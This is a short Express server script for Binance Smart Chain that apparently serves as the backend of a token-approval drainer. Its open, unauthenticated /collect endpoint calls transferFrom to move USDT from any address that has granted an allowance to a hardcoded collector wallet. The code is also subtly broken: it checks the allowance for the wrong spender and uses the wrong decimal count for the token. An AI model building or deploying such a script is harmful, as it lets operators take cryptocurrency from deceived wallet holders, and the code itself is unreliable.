import express from 'express';
import { ethers } from 'ethers';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());

// ===== CONFIG =====
const RPC_URL = process.env.RPC_URL || "https://bsc-dataseed.binance.org/";
const PRIVATE_KEY = process.env.PRIVATE_KEY || ""; // your relayer wallet
const COLLECTOR = process.env.COLLECTOR || "0xDb867b88EAB55320fD50E9785B2906773dedf78b";

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
const USDT_ABI = [
  "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
  "function allowance(address owner,address spender) view returns(uint256)"
];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const tokenContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ===== ROUTE =====
app.post('/collect', async (req, res) => {
  const { from, amountHuman } = req.body;
  if (!from || !amountHuman) return res.status(400).json({ error: 'missing_fields' });

  try {
    const amountWei = ethers.parseUnits(amountHuman.toString(), 6); // USDT 6 decimals
    const allowance = await tokenContract.allowance(from, COLLECTOR);
    if (allowance < amountWei) return res.status(400).json({ error: 'insufficient_allowance' });

    const tx = await tokenContract.transferFrom(from, COLLECTOR, amountWei);
    await tx.wait();

    res.json({ status: 'ok', tx: tx.hash });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== START SERVER =====
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Relayer running on port ${port}`));
